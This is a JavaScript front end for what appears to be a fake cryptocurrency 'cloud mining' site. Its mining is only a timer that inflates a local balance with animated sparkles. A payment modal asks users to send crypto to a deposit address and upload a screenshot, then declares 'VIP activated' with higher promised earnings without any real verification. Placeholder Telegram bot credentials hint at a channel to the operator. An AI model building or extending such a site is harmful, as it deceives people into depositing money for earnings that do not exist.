// DOM Elements
const navItems = document.querySelectorAll('.nav-item');
const startMiningBtn = document.getElementById('startMiningBtn');
const paymentModal = document.getElementById('paymentModal');
const closePaymentBtn = document.getElementById('closePaymentBtn');
const chainOptions = document.querySelectorAll('.chain-option');
const copyAddressBtn = document.getElementById('copyAddressBtn');
const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
const submitVerificationBtn = document.getElementById('submitVerificationBtn');
const miningCircle = document.querySelector('.mining-circle');
const miningCore = document.querySelector('.mining-core');
const miningStatusText = document.getElementById('miningStatus');
const miningSpeedText = document.getElementById('miningSpeed');
const screenshotUpload = document.getElementById('screenshotUpload');
const fileUploadArea = document.getElementById('fileUploadArea');
const filePreview = document.getElementById('filePreview');

// User data
let userData = {
    balance: 0.00,
    totalMined: 0.0000,
    miningActive: false,
    userStatus: 'free',
    dailyEarning: 0.10,
    currentSpeed: 0.5,
    userId: 'USR738225',
    totalMiningTime: 0
};

// Demo telegram API
const telegramBotToken = 'DEMO_TOKEN';
const telegramChatId = 'DEMO_CHATID';

let miningInterval;

// Initialization
document.addEventListener('DOMContentLoaded', function() {
    updateUI();
    setupEventListeners();
});

// Event listeners
function setupEventListeners() {
    startMiningBtn.addEventListener('click', handleMiningToggle);
    closePaymentBtn.addEventListener('click', closePaymentModal);
    chainOptions.forEach(opt => opt.addEventListener('click', handleChainSelection));
    copyAddressBtn.addEventListener('click', handleCopyAddress);
    confirmPaymentBtn.addEventListener('click', handleConfirmPayment);
    submitVerificationBtn.addEventListener('click', handleVerificationSubmission);
    fileUploadArea.addEventListener('click', () => screenshotUpload.click());
    screenshotUpload.addEventListener('change', handleFileUpload);
}

// Mining toggle
function handleMiningToggle() {
    if (userData.miningActive) stopMining();
    else startMining();
}

// Start mining
function startMining() {
    userData.miningActive = true;
    startMiningBtn.textContent = 'Stop Mining';
    miningCircle.classList.add('active');
    miningStatusText.textContent = 'Mining Active';
    
    miningInterval = setInterval(() => {
        const mined = userData.currentSpeed / 3600;
        userData.totalMined += mined;
        userData.balance += mined;
        updateUI();
        createMiningEffect();
    }, 1000);
}

// Stop mining
function stopMining() {
    userData.miningActive = false;
    startMiningBtn.textContent = 'Start Mining';
    miningCircle.classList.remove('active');
    miningStatusText.textContent = 'Mining Inactive';
    clearInterval(miningInterval);
}

// Update UI
function updateUI() {
    document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
    miningSpeedText.textContent = 'Speed: ' + userData.currentSpeed + ' BNB/H';
}

// Chain selection
function handleChainSelection(event) {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    event.currentTarget.classList.add('active');
    const chain = event.currentTarget.getAttribute('data-chain');
    const addressDisplay = document.getElementById('addressDisplay');
    addressDisplay.textContent = `${chain.toUpperCase()} Address: DEMO_ADDRESS\nMemo: ${userData.userId}`;
    addressDisplay.style.display = 'block';
    copyAddressBtn.disabled = false;
}

// Copy address
function handleCopyAddress() {
    copyToClipboard(document.getElementById('addressDisplay').textContent);
    showNotification('Address copied!', 'success');
}

// Confirm payment
function handleConfirmPayment() {
    paymentModal.style.display = 'none';
    document.getElementById('verificationSection').style.display = 'block';
}

// Close modal
function closePaymentModal() {
    paymentModal.style.display = 'none';
    document.getElementById('addressDisplay').style.display = 'none';
    copyAddressBtn.disabled = true;
}

// File upload
function handleFileUpload(e) {
    const file = e.target.files[0];
    if (!file) return;
    if (!file.type.startsWith('image/')) {
        showNotification('Please upload an image file', 'error');
        return;
    }
    const reader = new FileReader();
    reader.onload = function(e) {
        filePreview.innerHTML = `<img src="${e.target.result}" alt="Screenshot Preview">`;
        filePreview.style.display = 'block';
        showNotification('Screenshot uploaded!', 'success');
    };
    reader.readAsDataURL(file);
}

// Submit verification
function handleVerificationSubmission() {
    showNotification('Payment verified! VIP activated.', 'success');
    userData.userStatus = 'vip';
    userData.dailyEarning = 7.00;
    userData.currentSpeed = 15.0;
    updateUI();
}

// Utility
function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
}

function showNotification(message, type) {
    const notif = document.createElement('div');
    notif.className = 'notification ' + (type==='error'?'error':'success');
    notif.textContent = message;
    document.body.appendChild(notif);
    setTimeout(()=>notif.remove(),3000);
}

// Mining effect
function createMiningEffect() {
    const effect = document.createElement('div');
    effect.style.width = '10px';
    effect.style.height = '10px';
    effect.style.borderRadius = '50%';
    effect.style.background = '#FFD700';
    effect.style.position = 'absolute';
    effect.style.left = (50 + Math.random() * 60 - 30) + '%';
    effect.style.top = (50 + Math.random() * 60 - 30) + '%';
    effect.style.animation = 'miningEffect 1s ease-out forwards';
    miningCircle.appendChild(effect);
    setTimeout(() => effect.remove(), 1000);
}
